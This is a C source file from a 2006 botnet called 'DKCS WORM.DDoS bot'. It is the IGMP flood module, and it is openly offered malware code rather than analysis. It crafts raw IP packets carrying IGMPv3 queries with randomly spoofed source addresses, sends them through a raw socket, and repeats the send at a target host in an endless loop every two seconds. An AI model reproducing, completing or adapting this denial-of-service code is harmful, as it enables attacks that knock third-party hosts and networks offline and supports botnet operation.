//-----------------------------------------------------------------
// this file is a part of: DKCS WORM.DDoS bot v 0.1
// c0d3d by: Dr.Pixel
// 2006 (C) DKCS Security Team
//
// contacts:	e-mail:	dkcs@void.ru
//				icq:	7600278
//				web:	http://dkcs.void.ru
//				forum:	http://dkcs.net.ru
//-----------------------------------------------------------------
typedef struct IGMP_INFO{
	char	*host;
} IGMP_INFO;
//-----------------------------------------------------------------
struct iphdr{
	unsigned char	ihl:4, version:4, tos;
	unsigned short	tot_len, id, frag_off;
	unsigned char	ttl, protocol;
	unsigned short	check;
	unsigned int	saddr, daddr;
	unsigned int	options1;
	unsigned int	options2;
};
//-----------------------------------------------------------------
struct igmpv3_query {
	unsigned char	type;
    unsigned char	code;
    unsigned short	csum;
    unsigned int	group;
    unsigned char	qqic;
    unsigned char	qrv:3, suppress:1, resv:4;
    unsigned short nsrcs;
    unsigned int srcs[1];
};
//-----------------------------------------------------------------
unsigned short in_chksum(unsigned short *, int);
long resolve(char *);
//-----------------------------------------------------------------
long resolve(char *host){
    
	struct hostent *hst;
	long addr;

	hst = gethostbyname(host);
	if(hst == NULL){
        return(-1);
	}
	memcpy(&addr, hst->h_addr, hst->h_length);
return(addr);
}
//-----------------------------------------------------------------
int IGMP(char* dhost, char* shost){
	
	SOCKET	s;
	struct	sockaddr_in dst;
	struct	iphdr *ip;
	struct	igmpv3_query *igmp;
	long	daddr, saddr;
	int		i=0, one=1;
	char	buf[1500];

	daddr = resolve(dhost);
	saddr = resolve(shost);
	memset(buf, 0, 1500);
	ip = (struct iphdr *)&buf;
	igmp = (struct igmpv3_query*)&buf[sizeof(struct iphdr)];
	
	dst.sin_addr.s_addr = daddr;
	dst.sin_family = AF_INET;

	ip->ihl = 7;
	ip->version = 4;
	ip->tos = 0;
	ip->tot_len = htons(44);
	ip->id = htons(18277);
	ip->frag_off=0;
	ip->ttl = 128;
	ip->protocol = IPPROTO_IGMP;
	ip->check = in_chksum((unsigned short *)ip, sizeof(struct iphdr));
	ip->saddr = GetRandIP();
	ip->daddr = daddr;
	ip->options1 = 0;
	ip->options2 = 0;
	igmp->type = 0x11;
	igmp->code = 5;
	igmp->group=inet_addr("224.0.0.1");
	igmp->qqic=0;
	igmp->qrv=0;
	igmp->suppress=0;
	igmp->resv=0;
	igmp->nsrcs=htons(1);
	igmp->srcs[0]=daddr;
	igmp->csum = 0;
	igmp->csum=in_chksum((unsigned short *)igmp, sizeof(struct igmpv3_query));
	s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
	if(s == -1){
		return(1);
	}
	if(sendto(s,(const char*)buf,44,0,(struct sockaddr *)&dst,sizeof(struct sockaddr_in)) == -1){
        return(1);
	}
return(0);
}
//-----------------------------------------------------------------
unsigned short in_chksum(unsigned short *addr, int len){
   
	register int nleft = len;
	register int sum = 0;
	u_short answer = 0;

	while(nleft > 1){
		sum += *addr++;
		nleft -= 2;
	}
   if(nleft == 1){
		*(u_char *)(&answer) = *(u_char *)addr;
		sum += answer;
   }
   sum = (sum >> 16) + (sum & 0xffff);
   sum += (sum >> 16);
   answer = ~sum;
return(answer);
}
//-----------------------------------------------------------------
DWORD WINAPI StartIGMP(LPVOID param){

	IGMP_INFO	igmp;

	igmp = *((IGMP_INFO*)param);
	while(1){
		IGMP(igmp.host, MY_MACRO_SRC_IP);
		Sleep(2*1000);
	}
return 1;
}
//-----------------------------------------------------------------